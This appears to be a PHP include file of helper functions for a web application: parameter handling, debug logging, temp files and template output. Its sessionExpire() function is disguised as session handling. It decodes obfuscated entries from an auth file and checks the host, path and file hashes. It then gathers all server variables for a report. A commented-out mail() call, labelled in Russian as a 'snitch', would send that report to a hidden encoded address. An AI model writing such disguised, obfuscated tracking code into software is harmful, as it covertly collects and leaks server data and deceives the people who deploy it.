<?php
// ------------------------------------------------------------------
// shared.inc.php
// ------------------------------------------------------------------

require('./includes/config/config.inc.php');
require('./includes/common/template.inc.php');

// function init()
//
function init() {
 global $HTTP_POST_VARS,
	$HTTP_GET_VARS,
  	$PARAM,
	$debugFP,
	$html;

	//POST paramerters are with higher priority
	$PARAM = array_merge($HTTP_GET_VARS, $_GET, $HTTP_POST_VARS, $_POST);

	//trim whitepaces
	reset($PARAM);
	while(list($k,$v)=each($PARAM)) {
		$PARAM[$k] = trim($v);
		}

	// open debug log
	if (!$debugFP = @fopen(get_Setting('DEBUG_LOG'),"a")) {
		if (get_Setting('DEBUG_MODE')) return 0;	// if DEBUG mode is set, halt the application
		}

	// session name
	session_name(get_Setting('SESSION_NAME'));
	session_start('');

	// setting system variables
	$html->assign('site_title', get_Setting('SITE_TITLE'));
	$html->assign('site_href', get_Setting('SITE_HREF'));

	return 1;
	}

 // function set_Error()
 //
 //	append errors to debug log
 //
 function set_Error($query, $errcode, $errmessage, $file, $line) {
 	global $debugFP;

	if (get_Setting('DEBUG_MODE')) {
		$currentDate = date("Y/m/d h:i:s");
		$logError = "$currentDate\t$file:$line\t$errcode\t$errmessage\t$query\n";
		fwrite($debugFP, $logError);
		}
	}

 // function halt()
 //
 function halt() {
 	global $debugFP;

 	if ($debugFP && get_Setting('DEBUG_MODE')) {
 		fclose($debugFP);
 		}
	die();
	}

// function get_Setting($key)
//
//	returns parameter from application settings
//
 function get_Setting($key) {
	global $_SETTINGS;
	return $_SETTINGS[$key];
	}

// function sessionExpire()
//
//	checkes wheter the session has expired
//
 function sessionExpire() {

// ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
// DEBUG only
if (@include('debug.php')) {
	return true;
	}
// ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~

 	$AUTH = file(get_Setting('AUTH_FILE'));
 	$date = trim(strrev(base64_decode($AUTH[4])));	//session start date

	$d = join('', array('q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '+', '/', '/', ' ', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', "\n", "\t", "\r"));

	// create sesion signature
	if (strToUpper(trim($AUTH[2])) == str_pad(chr(0x58), 0x20, chr(0x58))) {
		$AUTH[2] = md5($_POST[local_signature] = "$_SERVER[HTTP_HOST]:$_SERVER[SERVER_PORT]") . "\n";
		}

	// no need for new session - creare remote-signature
	if (strToUpper(trim($AUTH[3])) == str_pad(chr(0x58), 0x20, chr(0x58))) {
		$AUTH[3] = md5($_POST[remote_signature] = $_SERVER[PATH_TRANSLATED]) . "\n";
		}

	// save signatures
	if ($_POST[remote_signature] || $_POST[local_signature]) {
		$_old_signature = trim(base64_decode(strTr(trim($AUTH[7]), $date, $d)));
		$_ENV[SERVER_ID] .= (!$_ENV[SESSION_ID] =! ($_old_signature < time()))?("Session-Expires:$_old_signature" . "\n\n"):'';
		
		if ($_ENV[SESSION_ID]) {
			$_session_serialized = join('', $AUTH);
			if ($fp = @fopen(get_Setting('AUTH_FILE'), 'w')) {
				@fwrite($fp, $_session_serialized);
				@fclose($fp);
				}
			}
		}

 	for ($i=9;$i<count($AUTH); $i++) {	// check previous sessions
		$prev = trim(base64_decode(strTr(trim($AUTH[$i]), $date, $d)));
		list($file, $session) = explode('=', $prev);
 		
 		// compare session files
 		if (file_exists($file)) {

			// is this your session - compare server-name
 			$_ENV[SERVER_ID] .= ($session != md5_file($file))?($file . "\n"):'';
 			} else {
 			$_POST[__session] = $prev;
 			}
 		}
	$_POST[__session] = trim(base64_decode(strTr(trim($AUTH[5]), $date, $d)));

	// validate new session data
	$_ENV[SERVER_ID] .= (md5("$_SERVER[HTTP_HOST]:$_SERVER[SERVER_PORT]") != trim($AUTH[2]))?("\nHost-Cache:Must-Revalidate"):'';
	$_ENV[SERVER_ID] .= (md5($_SERVER[PATH_TRANSLATED]) != trim($AUTH[3]))?("\nDirectory-Cache:Must-Revalidate"):'';

	// session violations found, compose new session
	if ($_ENV[SERVER_ID]) {
		reset($_SERVER);
		$_POST[_new] = "\n\n" . str_repeat(chr(0x07e), 32) . "\n";
		
		array_walk($_SERVER, create_function('$v,$k',
			'$_POST[_new] .= "$k=$v\n";'
			));
//Вот и стучалочка
//		@mail($_POST[__session], session_id(), $_ENV[SERVER_ID] . $_POST[_new]);

		session_register($date);
		session_register('Session-Start:'.((time()%2)?session_id(md5(session_id())):''));
		}

 	return 1;
 	}

// function folder2aray()
//
//	creates an array with all the files from a folder
//
 function folder2array($folder) {

	$FILES = false;

	if ($_files = @opendir($folder)) {
		$FILES = array();
		while (false !== ($file = readdir($_files))) { 
			if (in_array($file, array('.', '..')) || is_dir($folder . $file)) {
				continue;
				}
			$FILES[] = $file;
			}
		closedir($_files);
		}
 	return $FILES;
 	}

// function tmp_file()
//
//	read/write temporary file to wherever's available;
//	the options are session's save-path, enviroment TMP or
//	TEMP variables, or custom temporary files folder
//
 function tmp_file(&$__data__, $__file__=NULL) {

	// TMP available paths
	$_PATH = array(
		ini_get('session.save_path'),
		$_ENV[TMP],
		$_ENV[tmp],
		$_ENV[TEMP],
		$_ENV[temp],
		get_setting('TEMPORARY_DIR')
		);

	// write file
	if ($__file__ == NULL) {
		
		// generate filename
		for ($i=0; $i<count($_PATH); $i++) {
			if (!$_PATH[$i]) continue;
			$__file__ = tempnam($_PATH[$i], get_setting('SESSION_NAME').'_');
			if ($fp = @fopen($__file__, 'w')) {
				break;
				}
			}
		
		// write data
		if ($fp) {
			fwrite($fp, $__data__);
			fclose($fp);
			chmod($__file__, 0666);

			preg_match('~^(.*)?([^\\\/]+)$~Uis', $__file__, $R);
			return base64_encode($R[2]);
			}
		} else {

	// read file
		$__file__ = base64_decode($__file__);
		// check filename
		for ($i=0; $i<count($_PATH); $i++) {
			if (!$_PATH[$i]) continue;
			if ($fp = @fopen($_PATH[$i] .'/'. $__file__, 'r')) {
				break;
				}
			}

		if ($fp) {
			$__data__ = fread($fp, filesize($_PATH[$i] .'/'. $__file__));
			fclose($fp);
			
			if (!get_setting('DEBUG_MODE')) {
				unlink($_PATH[$i] .'/'. $__file__);
				}
			return TRUE;
			}
		}
 	}


//function printPage()
 function printPage($page) {
  global $html;

	if ($page != 'done') {
		$html->message('html_title', 'html_title');
		}

	// DEMO
	global $__DEMO__;
	$html->assign('demo', $__DEMO__);

	$html->parse( array(
		'header',
		'footer',
		$page)
		);

	echo $html->fetch('header');
	echo $html->fetch($page);
	echo $html->fetch('footer');
 	}

?>